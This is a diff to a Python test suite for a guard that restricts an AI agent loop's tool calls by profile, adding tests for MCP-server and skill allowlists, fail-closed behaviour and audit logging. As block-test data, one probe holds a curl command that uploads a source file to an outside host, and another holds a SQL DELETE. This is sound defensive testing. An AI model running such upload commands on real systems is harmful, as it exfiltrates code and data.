@@ -44,7 +44,7 @@ class GuardTestCase(unittest.TestCase):
         os.makedirs(os.path.join(self.project, ".specs", "project"))
         os.makedirs(self.data_dir)
         self.env = dict(os.environ)
-        for name in ("LOOP_APP_HOME", "LOOP_PR_BASE", "LOOP_INTEGRATION_BRANCH", "GUARD_PROD_HINTS", "LOOP_SPECS_DIR", "LOOP_TURN", "LOOP_HEADLESS"):  # LOOP_SPECS_DIR inherited from a loop turn would send these tests' blocks to the REAL guard.log
+        for name in ("LOOP_APP_HOME", "LOOP_PR_BASE", "LOOP_INTEGRATION_BRANCH", "GUARD_PROD_HINTS", "LOOP_SPECS_DIR", "LOOP_TURN", "LOOP_HEADLESS", "LOOP_ISOLATED", "LOOP_SKILLS_FILE"):  # LOOP_SPECS_DIR inherited from a loop turn would send these tests' blocks to the REAL guard.log
             self.env.pop(name, None)
         self.env["LOOP_DATA_DIR"] = self.data_dir
 
@@ -1282,6 +1282,8 @@ RULE_PROBES = {
     "egress-upload": dict(profile="executor", block=_bash("curl -X POST https://example.com -d @src/a.ts"), allow=_bash("curl https://example.com")),
     "agent-allowlist": dict(profile="orchestrator", block=("Agent", {"subagent_type": "general-purpose"}), allow=("Agent", {"subagent_type": "executor-back"})),
     "model-ceiling": dict(profile="orchestrator", block=("Agent", {"subagent_type": "executor-back", "model": "opus"}), allow=("Agent", {"subagent_type": "executor-back", "model": "sonnet"})),
+    "mcp-allowlist": dict(profile="executor", headless=True, block=("mcp__zendesk__get_ticket", {}), allow=("mcp__mcp-mysql-dev__mysql_query", {"query": "SELECT 1"})),
+    "skill-allowlist": dict(profile="executor", skills={"executor": ["backend-dev-skill"]}, block=("Skill", {"skill": "frontend-dev-skill"}), allow=("Skill", {"skill": "backend-dev-skill"})),
     "scope-unreadable": dict(profile="executor", scope_raw="{not json", block=_file("Edit", "@project/apps/a/x.ts"), allow=_file("Edit", "@project/.regression/x.ts")),
 }
 
@@ -1316,6 +1318,10 @@ class TestRuleProbes(V1GuardCase):
                         pass
                 self.prepare(probe)
                 env = {"LOOP_HEADLESS": "1"} if probe.get("headless") else {}
+                if probe.get("skills"):
+                    skills_path = os.path.join(self.tmp, "probe-skills.json")
+                    self.write_json(skills_path, probe["skills"])
+                    env["LOOP_SKILLS_FILE"] = skills_path
                 tool, tool_input = self.resolve(probe["block"])
                 code, err = self.run_full(tool, tool_input, probe.get("block_profile", probe["profile"]), env=env)
                 self.assertEqual(code, BLOCKED, (rule, err))
@@ -1831,6 +1837,134 @@ class TestAudit20261022Regression(HardeningCase):
         with open(self.specs("project", "loop", "json", "SCOPE.json"), "w", encoding="utf-8") as handle:
             handle.write("{not json")
         self.assert_rule(*self.run_full("Write", {"file_path": os.path.join(self.project, "apps", "a", "x.ts")}), "scope-unreadable")
+
+
+class TestIsolationAllowlists(GuardTestCase):
+    """mcp-allowlist / skill-allowlist: active only with LOOP_HEADLESS / LOOP_ISOLATED (MCP) or LOOP_SKILLS_FILE (skills); HARD; audit line on allow."""
+    DEV = "mcp__mcp-mysql-dev__mysql_query"
+    PROD = "mcp__mcp-mysql-prod__mysql_query"
+    SELECT = {"query": "SELECT 1"}
+
+    def guard_log(self):
+        path = self.specs("project", "loop", "internal", "guard.log")
+        return [json.loads(line) for line in read_text(path).splitlines()] if os.path.exists(path) else []
+
+    def skills_file(self, table):
+        path = os.path.join(self.tmp, "skills.json")
+        self.write_json(path, table)
+        self.env["LOOP_SKILLS_FILE"] = path
+
+    def test_dev_sql_per_profile(self):
+        self.env["LOOP_ISOLATED"] = "1"
+        for profile in ("executor", "verifier", "spec", "orchestrator", "planning", "roadmapmap", "subprojects", "systemmap"):
+            self.assertEqual(self.run_guard(self.DEV, self.SELECT, profile), PASSED, profile)
+
+    def test_prod_sql_only_orchestrator_and_planning(self):
+        self.env["LOOP_HEADLESS"] = "1"
+        for profile in ("orchestrator", "planning"):
+            self.assertEqual(self.run_guard(self.PROD, self.SELECT, profile), PASSED, profile)
+        for profile in ("executor", "verifier", "spec", "roadmapmap", "subprojects", "systemmap"):
+            self.assertEqual(self.run_guard(self.PROD, self.SELECT, profile), BLOCKED, profile)
+
+    def test_other_mcp_denied_and_unknown_profile_falls_back_to_executor(self):
+        self.env["LOOP_ISOLATED"] = "1"
+        self.assertEqual(self.run_guard("mcp__zendesk__get_ticket", {}, "orchestrator"), BLOCKED)
+        self.assertEqual(self.run_guard("mcp__idatamcp__listar_roles", {}, "planning"), BLOCKED)
+        self.assertEqual(self.run_guard(self.DEV, self.SELECT, "made-up"), PASSED)
+        self.assertEqual(self.run_guard(self.PROD, self.SELECT, "made-up"), BLOCKED)
+
+    def test_grafana_reads_pass_everywhere_writes_stay_blocked(self):
+        self.env["LOOP_ISOLATED"] = "1"
+        for profile in PROFILES_UNDER_TEST:
+            self.assertEqual(self.run_guard("mcp__grafana__query_loki_logs", {}, profile), PASSED, profile)
+            self.assertEqual(self.run_guard("mcp__grafana__update_dashboard", {}, profile), BLOCKED, profile)
+
+    def test_sql_write_still_filtered(self):
+        self.env["LOOP_ISOLATED"] = "1"
+        self.assertEqual(self.run_guard(self.DEV, {"query": "DELETE FROM t"}, "executor"), BLOCKED)
+
+    def test_allowlist_is_not_released_by_permissions_json(self):
+        self.env["LOOP_ISOLATED"] = "1"
+        self.allow("mcp-allowlist")
+        self.assertEqual(self.run_guard("mcp__zendesk__get_ticket", {}, "executor"), BLOCKED)
+
+    def test_inactive_without_the_variables(self):
+        self.assertEqual(self.run_guard("mcp__zendesk__get_ticket", {}, "executor"), PASSED)
+        self.assertEqual(self.run_guard(self.PROD, self.SELECT, "executor"), PASSED)
+        self.assertEqual(self.run_guard("Skill", {"skill": "anything"}, "executor"), PASSED)
+        self.assertEqual(self.guard_log(), [])
+
+    def test_skill_allowlist_per_profile_with_prefix_strip(self):
+        self.skills_file({"executor": ["backend-dev-skill"], "verifier": []})
+        self.assertEqual(self.run_guard("Skill", {"skill": "backend-dev-skill"}, "executor"), PASSED)
+        self.assertEqual(self.run_guard("Skill", {"skill": "plugin:Backend-Dev-Skill"}, "executor"), PASSED)
+        self.assertEqual(self.run_guard("Skill", {"skill": "/backend-dev-skill"}, "executor"), PASSED)
+        self.assertEqual(self.run_guard("Skill", {"name": "backend-dev-skill"}, "executor"), PASSED)
+        self.assertEqual(self.run_guard("Skill", {"skill": "frontend-dev-skill"}, "executor"), BLOCKED)
+        self.assertEqual(self.run_guard("Skill", {"skill": "backend-dev-skill"}, "verifier"), BLOCKED)
+        self.assertEqual(self.run_guard("Skill", {}, "executor"), BLOCKED)
+
+    def test_skill_allowlist_fails_closed(self):
+        self.env["LOOP_SKILLS_FILE"] = os.path.join(self.tmp, "missing.json")
+        self.assertEqual(self.run_guard("Skill", {"skill": "x"}, "executor"), BLOCKED)
+        with open(os.path.join(self.tmp, "bad.json"), "w", encoding="utf-8") as handle:
+            handle.write("{nope")
+        self.env["LOOP_SKILLS_FILE"] = os.path.join(self.tmp, "bad.json")
+        self.assertEqual(self.run_guard("Skill", {"skill": "x"}, "executor"), BLOCKED)
+        self.skills_file({"executor": ["x"]})
+        self.assertEqual(self.run_guard("Skill", {"skill": "x"}, "planning"), BLOCKED)
+
+    def test_skill_allowlist_not_released_by_permissions_json(self):
+        self.skills_file({"executor": []})
+        self.allow("skill-allowlist")
+        self.assertEqual(self.run_guard("Skill", {"skill": "x"}, "executor"), BLOCKED)
+
+    def test_subagent_uses_its_agent_profile(self):
+        self.skills_file({"executor": ["backend-dev-skill"], "orchestrator": []})
+        self.assertEqual(self.run_guard("Skill", {"skill": "backend-dev-skill"}, "auto", agent_type="maestro:executor-back"), PASSED)
+        self.env["LOOP_HEADLESS"] = "1"
+        self.assertEqual(self.run_guard("Skill", {"skill": "backend-dev-skill"}, "auto"), BLOCKED)  # main session = orchestrator
+
+    def test_audit_line_for_allowed_mcp_and_skill(self):
+        self.env["LOOP_ISOLATED"] = "1"
+        self.skills_file({"executor": ["backend-dev-skill"]})
+        self.run_guard(self.DEV, {"query": "  select * from t"}, "executor", agent_type="executor-back")
+        self.run_guard("mcp__grafana__query_loki_logs", {}, "executor")
+        self.run_guard("Skill", {"skill": "plugin:backend-dev-skill"}, "executor")
+        self.run_guard("Read", {"file_path": os.path.join(self.project, "a.txt")}, "executor")
+        self.run_guard("mcp__zendesk__get_ticket", {}, "executor")
+        lines = [line for line in self.guard_log() if line["decision"] == "allow"]
+        self.assertEqual([(line["tool"], line["subject"]) for line in lines],
+                         [(self.DEV, "SELECT"), ("mcp__grafana__query_loki_logs", ""), ("Skill", "backend-dev-skill")])
+        self.assertEqual(lines[0]["profile"], "executor")
+        self.assertEqual(lines[0]["agent"], "executor-back")
+        self.assertEqual(sum(1 for line in self.guard_log() if line["decision"] == "blocked"), 1)
+
+    def test_isolated_auto_without_agent_resolves_to_planning(self):
+        self.env["LOOP_ISOLATED"] = "1"
+        self.skills_file({"planning": ["backend-dev-skill"]})
+        self.assertEqual(self.run_guard("mcp__zendesk__get_ticket", {}, "auto"), BLOCKED)
+        self.assertEqual(self.run_guard("Skill", {"skill": "frontend-dev-skill"}, "auto"), BLOCKED)
+        self.assertEqual(self.run_guard("Skill", {"skill": "backend-dev-skill"}, "auto"), PASSED)
+        self.assertEqual(self.run_guard("Write", {"file_path": os.path.join(self.project, "src", "a.ts")}, "auto"), BLOCKED)
+        self.assertEqual(self.run_guard("Write", {"file_path": self.specs("features", "f", "spec.md")}, "auto"), PASSED)
+        self.assertEqual(self.run_guard(self.PROD, self.SELECT, "auto"), PASSED)
+
+    def test_auto_without_agent_and_without_variables_is_untouched(self):
+        self.assertEqual(self.run_guard("mcp__zendesk__get_ticket", {}, "auto"), PASSED)
+        self.assertEqual(self.run_guard("Write", {"file_path": os.path.join(self.project, "src", "a.ts")}, "auto"), PASSED)
+
+    def test_isolated_auto_subagent_keeps_agent_profile(self):
+        self.env["LOOP_ISOLATED"] = "1"
+        self.assertEqual(self.run_guard(self.PROD, self.SELECT, "auto", agent_type="maestro:executor-back"), BLOCKED)
+        self.assertEqual(self.run_guard(self.DEV, self.SELECT, "auto", agent_type="maestro:executor-back"), PASSED)
+
+    def test_no_audit_when_rules_inactive(self):
+        self.run_guard(self.DEV, self.SELECT, "executor")
+        self.assertEqual(self.guard_log(), [])
+
+
+PROFILES_UNDER_TEST = ("executor", "verifier", "spec", "orchestrator", "planning", "roadmapmap", "subprojects", "systemmap")
 
 
 if __name__ == "__main__":
